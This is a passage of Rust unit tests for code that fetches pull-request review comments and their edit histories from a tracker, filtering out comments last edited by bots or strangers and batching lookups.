            Vec::<String>::new()
        );
    }

    #[test]
    fn a_bot_as_the_last_editor_is_dropped_though_the_newest_entry_is_a_user_of_the_same_login() {
        // The history agrees with the editor by login, but the last editor is not a person.
        let node = json!({
            "id": "PRRC_abc",
            "lastEditedAt": EDITED_AT,
            "editor": {"__typename": "Bot", "login": "rawphp"},
            "userContentEdits": edit_history(2, &BY_INSTRUCTOR_ONLY),
        });
        assert_eq!(
            inline_kept_given(&edit_nodes_reply(&[node])),
            Vec::<String>::new()
        );
    }

    #[test]
    fn an_edited_inline_comment_that_is_gone_or_has_no_id_is_dropped_and_the_review_stays() {
        let inline = [
            edited_inline("gone", Some("PRRC_gone")),
            edited_inline("no id", None),
        ];
        let fake = FakeTracker::answering([
            Answer::ok(feedback_reply(
                &[review_with("2026-10-04T11:00:00Z", &inline)],
                &[],
            )),
            Answer::ok(edit_nodes_reply(&[Value::Null])),
        ]);
        let got = read(&fake);
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].inline, vec![]);
        // Only the one with an id was looked up.
        assert_eq!(
            fake.calls(),
            vec![
                feedback_call(PR_FEEDBACK_QUERY, &[]),
                editor_call(&ids(&["PRRC_gone"]))
            ]
        );
    }

    fn edited_inline_list(from: usize, n: usize) -> Vec<Value> {
        (0..n)
            .map(|k| {
                edited_inline(
                    &format!("note {}", from + k),
                    Some(&format!("E{}", from + k)),
                )
            })
            .collect()
    }

    fn whole_history_node(i: usize) -> Value {
        edit_node(
            &format!("E{i}"),
            "rawphp",
            edit_history(2, &BY_INSTRUCTOR_ONLY),
        )
    }

    #[test]
    fn the_edited_inline_comments_of_every_review_are_read_with_one_extra_call() {
        let reviews = [
            review_node(
                11,
                "COMMENTED",
                "one",
                Some("2026-10-04T11:00:00Z"),
                "rawphp",
                &edited_inline_list(0, 3),
            ),
            review_node(
                12,
                "COMMENTED",
                "two",
                Some("2026-10-04T11:01:00Z"),
                "rawphp",
                &edited_inline_list(3, 2),
            ),
        ];
        let mut nodes: Vec<Value> = (0..5).map(whole_history_node).collect();
        // E1's last editor is a stranger.
        nodes[1] = edit_node("E1", "stranger", edit_history(2, &BY_STRANGER));
        // The answer comes in any order: it is matched by id, not by position.
        nodes.reverse();
        let fake = FakeTracker::answering([
            Answer::ok(feedback_reply(&reviews, &[])),
            Answer::ok(edit_nodes_reply(&nodes)),
        ]);
        let got = read(&fake);
        assert_eq!(got.len(), 2);
        let bodies =
            |at: usize| -> Vec<&str> { got[at].inline.iter().map(|c| c.body.as_str()).collect() };
        assert_eq!(bodies(0), vec!["note 0", "note 2"]);
        assert_eq!(bodies(1), vec!["note 3", "note 4"]);
        assert_eq!(
            fake.calls(),
            vec![
                feedback_call(PR_FEEDBACK_QUERY, &[]),
                editor_call(&ids(&["E0", "E1", "E2", "E3", "E4"]))
            ]
        );
    }

    #[test]
    fn a_hundred_and_one_edited_inline_comments_are_read_with_two_extra_calls() {
        let review = review_node(
            11,
            "COMMENTED",
            "many",
            Some("2026-10-04T11:00:00Z"),
            "rawphp",
            &edited_inline_list(0, 101),
        );
        let fake = FakeTracker::answering([
            Answer::ok(feedback_reply(&[review], &[])),
            Answer::ok(edit_nodes_reply(
                &(0..100).map(whole_history_node).collect::<Vec<_>>(),
            )),
            Answer::ok(edit_nodes_reply(&[whole_history_node(100)])),
        ]);
        let got = read(&fake);
        assert_eq!(got[0].inline.len(), 101);
        let node_ids = |from: usize, to: usize| -> Vec<String> {
            (from..to).map(|i| format!("E{i}")).collect()
        };
        assert_eq!(
            fake.calls(),
            vec![
                feedback_call(PR_FEEDBACK_QUERY, &[]),
                editor_call(&node_ids(0, 100)),
                editor_call(&node_ids(100, 101))
            ]
        );
    }

    #[test]
    fn a_null_entry_or_a_missing_id_drops_only_that_comment() {
        let review = review_node(
            11,
            "COMMENTED",
            "mixed",
            Some("2026-10-04T11:00:00Z"),
            "rawphp",
            &edited_inline_list(0, 4),
        );
        // E1 is null, E2 is not in the answer at all.
        let fake = FakeTracker::answering([
            Answer::ok(feedback_reply(&[review], &[])),
            Answer::ok(edit_nodes_reply(&[
                whole_history_node(0),
                Value::Null,
                whole_history_node(3),
            ])),
        ]);
        let got = read(&fake);
        let bodies: Vec<&str> = got[0].inline.iter().map(|c| c.body.as_str()).collect();
        assert_eq!(bodies, vec!["note 0", "note 3"]);
    }

    #[test]
    fn an_edited_inline_comment_of_a_review_before_since_makes_no_extra_call() {
        let inline = [edited_inline("old", Some("PRRC_old"))];
        let fake = FakeTracker::answering([Answer::ok(feedback_reply(
            &[review_with("2026-10-04T10:00:00Z", &inline)],
            &[],
        ))]);
        assert_eq!(read(&fake), vec![]);
        assert_eq!(fake.calls().len(), 1);
    }

    #[test]
    fn an_edited_inline_comment_by_a_stranger_makes_no_extra_call() {
        let mut by_stranger = edited_inline("theirs", Some("PRRC_x"));
        by_stranger["author"] = person("stranger");
        let fake = FakeTracker::answering([Answer::ok(feedback_reply(
            &[review_with("2026-10-04T11:00:00Z", &[by_stranger])],
            &[],
        ))]);
        read(&fake);
        assert_eq!(fake.calls().len(), 1);
    }

    #[test]
    fn a_failed_or_unreadable_edit_history_read_is_an_error() {
        let main = feedback_reply(
            &[review_with(
                "2026-10-04T11:00:00Z",
                &[edited_inline("touched up", Some("PRRC_abc"))],
            )],
            &[],
        );
        let failed = FakeTracker::answering([Answer::ok(main.as_str()), Answer::fail(1, "boom")]);
        let error = feedback_error(&failed);
        assert!(
            matches!(&error, TrackerError::Other { kind: OtherKind::Failed, message: m } if m.contains("exited with status 1: boom")),
            "{error}"
        );
        let garbled = FakeTracker::answering([
            Answer::ok(main.as_str()),
            Answer::ok(
                r#"{"data":{"nodes":[{"id":"PRRC_abc","lastEditedAt":"2026-10-04T11:05:00Z"}]}}"#,
            ),
        ]);
        assert!(is_parse(&feedback_error(&garbled)));
    }
}
